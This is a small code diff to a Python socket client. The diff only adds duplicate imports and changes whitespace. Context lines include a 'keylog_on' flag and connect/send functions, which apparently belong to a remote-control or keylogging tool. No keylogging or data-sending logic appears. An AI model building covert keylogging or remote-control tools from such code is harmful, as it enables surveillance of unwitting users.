@@ -1,6 +1,9 @@
 import socket
 from PIL import Image
 import io
+import logging
+import socket
+
 
 HEADER = 64
 PORT = 5050
@@ -36,7 +39,6 @@ def manual():
 keylog_on = False
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 
 def send(msg):
     message = msg.encode(FORMAT)
@@ -141,7 +143,9 @@ def connect(address):
         return False
 
 def tryConnect(ip):
+
     return connect(ip)
+    
            
 # while True:
 #     while True:
